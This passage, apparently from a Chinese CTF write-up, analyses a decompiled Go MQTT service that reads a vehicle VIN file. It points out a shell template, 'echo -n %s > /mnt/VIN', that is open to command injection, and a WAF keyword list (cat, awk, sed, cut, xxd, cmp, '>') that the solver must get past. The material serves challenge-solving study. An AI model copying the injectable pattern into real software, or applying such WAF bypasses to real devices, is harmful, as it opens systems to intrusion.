+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="n">v27</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-1D0h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v28</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-1A0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">VinFile</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-198h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v30</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-190h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="n">v31</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span> <span class="c1">// [rsp+58h] [rbp-188h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">__int128</span> <span class="n">v32</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-178h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int16</span> <span class="n">v33</span><span class="p">;</span> <span class="c1">// [rsp+B8h] [rbp-128h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v34</span><span class="p">;</span> <span class="c1">// [rsp+108h] [rbp-D8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v35</span><span class="p">;</span> <span class="c1">// [rsp+110h] [rbp-D0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v36</span><span class="p">;</span> <span class="c1">// [rsp+118h] [rbp-C8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v37</span><span class="p">;</span> <span class="c1">// [rsp+120h] [rbp-C0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v38</span><span class="p">;</span> <span class="c1">// [rsp+128h] [rbp-B8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v39</span><span class="p">;</span> <span class="c1">// [rsp+130h] [rbp-B0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v40</span><span class="p">;</span> <span class="c1">// [rsp+138h] [rbp-A8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">__int128</span> <span class="n">v41</span><span class="p">;</span> <span class="c1">// [rsp+140h] [rbp-A0h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v42</span><span class="p">;</span> <span class="c1">// [rsp+158h] [rbp-88h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="p">(</span><span class="n">__golang</span> <span class="o">**</span><span class="n">v43</span><span class="p">)(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kt">int</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">);</span> <span class="c1">// [rsp+160h] [rbp-80h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">__int128</span> <span class="n">v44</span><span class="p">;</span> <span class="c1">// [rsp+170h] [rbp-70h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v45</span><span class="p">;</span> <span class="c1">// [rsp+188h] [rbp-58h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v46</span><span class="p">;</span> <span class="c1">// [rsp+190h] [rbp-50h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">mqtt_WebsocketOptions</span> <span class="o">*</span><span class="n">p_mqtt_WebsocketOptions</span><span class="p">;</span> <span class="c1">// [rsp+198h] [rbp-48h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">net_Dialer</span> <span class="o">*</span><span class="n">v48</span><span class="p">;</span> <span class="c1">// [rsp+1A8h] [rbp-38h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v49</span><span class="p">;</span> <span class="c1">// [rsp+1B0h] [rbp-30h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v50</span><span class="p">;</span> <span class="c1">// [rsp+1B8h] [rbp-28h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">__int128</span> <span class="n">v51</span><span class="p">;</span> <span class="c1">// [rsp+1C0h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">sync_WaitGroup</span> <span class="o">*</span><span class="n">p_sync_WaitGroup</span><span class="p">;</span> <span class="c1">// [rsp+1D0h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v53</span><span class="p">;</span> <span class="c1">// [rsp+1D8h] [rbp-8h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main_lookup</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">37</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v27</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">8LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">VinFile</span> <span class="o">=</span> <span class="nf">main_readFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">              <span class="s">&#34;/mnt/VINomitzeroGoStringsignal: readlinksendfilenil PoolThursdaySaturdayFebruaryNovemberDecember%!Month(seconds:48828125infinitystrconv.parsing ParseIntscavengepollDescsynctesttraceBufdeadlockraceFinipanicnilcgocheckrunnable is not  pointer, errno= packed=BAD RANK status unknown(trigger= npages= nalloc= nfreed=) errno=[signal  newval= mcount= bytes, </span><span class="se">\n</span><span class="s">-----</span><span class="se">\n\n</span><span class="s"> stack=[ minLC=  maxpc= </span><span class="se">\t</span><span class="s">stack=[ minutes status= etypes no anode/uid_map/gid_mapnetedns0[::1]:53continue_gatewayinvalid address raw-readreadfromunixgramUNSUBACKPINGRESPtlsmlkemCurveID(finishedhijackedLocationif-matchlocationHTTP/1.1no-cacheContinueAcceptedConflictNO_PROXYno_proxyRSV1 setRSV2 setRSV3 setbad MASKavx512bwavx512vloverflowgo/typesnet/httpgo/buildClassANYQuestionMD5+SHA1SHA3-224SHA3-256SHA3-384SHA3-512SHA1-RSADSA-SHA1DNS nameexporterECDH PCTReceivedif-range#fips1402.5.4.102.5.4.112.5.4.17CTR_DRBGSHA2-256avx512cdavx512eravx512pfavx512dqSHA2-512 of type omitemptyfork/execcontinued#execwait/dev/nullWednesdaySeptemberlocaltimeConnect()not foundall_proxy127.0.0.1connectedInheritedcomplex64interfaceinvalid nreflect: funcargs(bad indirInterface244140625ParseUintrwxrwxrwxtimerSendpollCacheprofBlockstackpoolhchanLeafwbufSpansGC (idle)mSpanDeadinittracescavtracepanicwaitchan sendpreemptedcoroutinesignal 32signal 33signal 34signal 35signal 36signal 37signal 38signal 39signal 40signal 41signal 42signal 43signal 44signal 45signal 46signal 47signal 48signal 49signal 50signal 51signal 52signal 53signal 54signal 55signal 56signal 57signal 58signal 59signal 60signal 61signal 62signal 63signal 64copystackLINUX_2.6 -&gt; node= ms cpu,  (forced) wbuf1.n= wbuf2.n= s.limit= s.state= B work ( B exp.)  marked   unmarked in use)</span><span class="se">\n</span><span class="s">, size = bad prune, tail = newosprocrecover:  not in [ctxt != 0, oldval=, newval= threads=: status= blocked= lockedg=atomicor8 runtime= sigcode= m-&gt;curg=(unknown)total &lt; 0traceback} stack=[ gp.goid= lockedm=interruptbus errorfiles,dnsdns,filesipv6-icmp_outboundlocalhostattempts:SUBSCRIBE%s %q: %sempty urltlsrsakex%s %x %x</span><span class="se">\n</span><span class="s">HandshakewebsocketsucceededSee OtherUse ProxyForbiddenNot FoundToo EarlyTrailer: ALL_PROXY&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">              <span class="mi">8LL</span><span class="p">);</span>                             <span class="c1">// mnt_vin
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">version</span> <span class="o">=</span> <span class="nf">main_readFile</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mnt_version</span><span class="p">,</span> <span class="mi">12LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="mi">8LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">qword_996878</span> <span class="o">=</span> <span class="mi">8LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">runtime_writeBarrier</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">runtime_gcWriteBarrier2</span><span class="p">(</span><span class="n">version</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="n">VinFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v5</span> <span class="o">=</span> <span class="n">VinFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">main_vin</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v4</span> <span class="o">=</span> <span class="n">VinFile</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">main_vin</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">main_vinCP</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>                      <span class="c1">// copy?
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">qword_996888</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">runtime_writeBarrier</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="nf">runtime_gcWriteBarrier2</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v8</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">main_vinHash</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">main_vinHash</span> <span class="o">=</span> <span class="n">v7</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="nf">runtime_makemap_small</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v32</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v26</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v53</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="n">__golang</span> <span class="o">*</span><span class="p">)(</span><span class="kr">__int64</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="kr">__int64</span><span class="p">,</span> <span class="n">_QWORD</span> <span class="o">*</span><span class="p">))</span><span class="n">setZero</span><span class="p">)(</span><span class="n">v9</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v27</span><span class="p">[</span><span class="mi">6</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v33</span> <span class="o">=</span> <span class="mi">257</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v34</span> <span class="o">=</span> <span class="mi">30LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v35</span> <span class="o">=</span> <span class="mi">10000000000LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v36</span> <span class="o">=</span> <span class="mi">30000000000LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v37</span> <span class="o">=</span> <span class="mi">600000000000LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v38</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v39</span> <span class="o">=</span> <span class="mi">30000000000LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v40</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v41</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v42</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v43</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">lostHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v44</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v45</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v46</span> <span class="o">=</span> <span class="n">v11</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">p_mqtt_WebsocketOptions</span> <span class="o">=</span> <span class="p">(</span><span class="n">mqtt_WebsocketOptions</span> <span class="o">*</span><span class="p">)</span><span class="nf">runtime_newobject</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RTYPE_mqtt_WebsocketOptions</span><span class="p">);</span><span class="c1">// start init mqtt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">p_net_Dialer</span> <span class="o">=</span> <span class="p">(</span><span class="n">net_Dialer</span> <span class="o">*</span><span class="p">)</span><span class="nf">runtime_newobject</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RTYPE_net_Dialer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">p_net_Dialer</span><span class="o">-&gt;</span><span class="n">Timeout</span> <span class="o">=</span> <span class="mi">30000000000LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v48</span> <span class="o">=</span> <span class="n">p_net_Dialer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v49</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v50</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v13</span> <span class="o">=</span> <span class="n">main_broker</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v14</span> <span class="o">=</span> <span class="nf">github_com_eclipse_paho_2emqtt_2egolang__ptr_ClientOptions_AddBroker</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v32</span><span class="p">,</span> <span class="n">main_broker</span><span class="p">,</span> <span class="n">CTF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v15</span> <span class="o">=</span> <span class="n">main_clientID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="n">qword_98A648</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">runtime_writeBarrier</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v14</span> <span class="o">=</span> <span class="nf">runtime_gcWriteBarrier2</span><span class="p">(</span><span class="n">v14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v16</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v16</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">24</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">160</span><span class="p">)</span> <span class="o">=</span> <span class="mi">60LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">runtime_writeBarrier</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v14</span> <span class="o">=</span> <span class="nf">runtime_gcWriteBarrier2</span><span class="p">(</span><span class="n">v14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v18</span> <span class="o">=</span> <span class="n">v17</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v18</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">240</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">232</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">MsgHandler</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v14</span> <span class="o">+</span> <span class="mi">240</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Main_main_func1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v19</span> <span class="o">=</span> <span class="nf">github_com_eclipse_paho_2emqtt_2egolang_NewClient</span><span class="p">((</span><span class="n">_ptr_url_URL</span> <span class="o">**</span><span class="p">)</span><span class="n">v14</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">main_mqttClient</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v19</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">runtime_writeBarrier</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v19</span> <span class="o">=</span> <span class="p">(</span><span class="n">RTYPE</span> <span class="o">**</span><span class="p">)</span><span class="nf">runtime_gcWriteBarrier2</span><span class="p">(</span><span class="n">v19</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v20</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v20</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">qword_9968C8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">qword_9968C8</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v28</span> <span class="o">=</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="n">__golang</span> <span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">v19</span><span class="p">[</span><span class="mi">4</span><span class="p">])(</span><span class="n">v13</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v30</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="p">(</span><span class="n">__golang</span> <span class="o">**</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))(</span><span class="n">v28</span> <span class="o">+</span> <span class="mi">40</span><span class="p">))(</span><span class="n">v13</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v21</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kr">__int64</span> <span class="p">(</span><span class="n">__golang</span> <span class="o">**</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))(</span><span class="n">v28</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))(</span><span class="n">v30</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v21</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v21</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v22</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kr">__int64</span> <span class="p">(</span><span class="n">__golang</span> <span class="o">**</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">))(</span><span class="n">v28</span> <span class="o">+</span> <span class="mi">32</span><span class="p">))(</span><span class="n">v30</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v51</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v22</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v22</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v51</span> <span class="o">=</span> <span class="n">v22</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v51</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">log_Fatal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v51</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">p_sync_WaitGroup</span> <span class="o">=</span> <span class="p">(</span><span class="n">sync_WaitGroup</span> <span class="o">*</span><span class="p">)</span><span class="nf">runtime_newobject</span><span class="p">(</span><span class="o">&amp;</span><span class="n">RTYPE_sync_WaitGroup</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sync__ptr_WaitGroup_Add</span><span class="p">(</span><span class="n">p_sync_WaitGroup</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v23</span> <span class="o">=</span> <span class="nf">runtime_newobject</span><span class="p">((</span><span class="k">const</span> <span class="n">RTYPE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_6DE880</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">v23</span> <span class="o">=</span> <span class="n">main_main_gowrap1</span><span class="p">;</span>                     <span class="c1">// goroutine
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span> <span class="n">runtime_writeBarrier</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v23</span> <span class="o">=</span> <span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="nf">runtime_gcWriteBarrier1</span><span class="p">(</span><span class="n">v23</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v24</span> <span class="o">=</span> <span class="n">p_sync_WaitGroup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v25</span> <span class="o">=</span> <span class="n">p_sync_WaitGroup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v24</span> <span class="o">=</span> <span class="n">p_sync_WaitGroup</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v23</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v24</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">runtime_newproc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v31</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">RTYPE_string</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v31</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">off_791490</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fmt_Fprintln</span><span class="p">(</span><span class="o">&amp;</span><span class="n">go_itab__ptr_os_File_comma_io_Writer</span><span class="p">,</span> <span class="n">os_Stdout</span><span class="p">,</span> <span class="n">v31</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sync__ptr_WaitGroup_Wait</span><span class="p">(</span><span class="n">p_sync_WaitGroup</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>需要注意的地方是go语言字符串是一个地址形式加上长度形式，ida识别不出长度，所以反编译的结果字符串会很长很乱。总而言之程序读取了<code>/mnt/version</code>和<code>/mnt/VIN</code>两个文件，并在msgHandler里实现了三个json字段：<code>auth</code>，<code>cmd</code>，<code>args</code>，其中auth字段为原始VIN码经过程序加密算法进行得到，cmd有两个选项：<code>get_version</code>和<code>set_vin</code>，其中set_bin使用了<code>echo -n %s &gt; /mnt/VIN</code></p>
+<p>注意，我们的输入需要绕过WAF，即</p>
+<pre tabindex="0"><code>.rodata:0000000000720838 aCatawksedcutxx db &#39;catawksedcutxxdcmp&#39; ; DATA XREF: .rodat
+</code></pre><p>另外地，实际上使用“&gt;”也会被WAF报措</p>
